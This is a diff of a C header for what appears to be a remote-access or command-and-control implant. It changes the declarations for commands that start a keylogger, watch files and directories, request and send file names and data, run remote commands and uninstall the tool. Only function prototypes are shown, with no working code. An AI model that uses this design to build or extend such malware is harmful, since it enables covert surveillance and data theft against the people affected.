@@ -17,6 +17,7 @@ struct List {
     struct Blob *head;
     struct Blob *tail;
     enum command_type type;
+    size_t list_size;
 };
 
 int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4);
@@ -34,19 +35,17 @@ void print_list(struct List *list);
 
 int cmd_uninstall(struct Context *ctx);
 
-int cmd_req_file_name(struct Context *ctx);
-int cmd_req_file_data(struct Context *ctx);
+int cmd_req_file_name(struct Context *ctx, struct List *list);
+int rep_req_file_data(struct Context *ctx);
 
 int cmd_send_file_name(struct Context *ctx, struct List *list);
-int cmd_send_file_data(struct Context *ctx);
 
-int cmd_start_kl(struct Context *ctx);
-int cmd_start_watch_file(struct Context *ctx);
-int cmd_start_watch_dir(struct Context *ctx);
+int cmd_start_kl(struct Context *ctx, struct List *list);
+int cmd_start_watch_file(struct Context *ctx, struct List *list);
+int cmd_start_watch_dir(struct Context *ctx, struct List *list);
 int cmd_stop(struct Context *ctx);
 
-int cmd_remote_run(struct Context *ctx);
-int cmd_disconnect(struct Context *ctx);
+int cmd_remote_run(struct Context *ctx, struct List *list);
 
 
 #endif // RUNNER_H
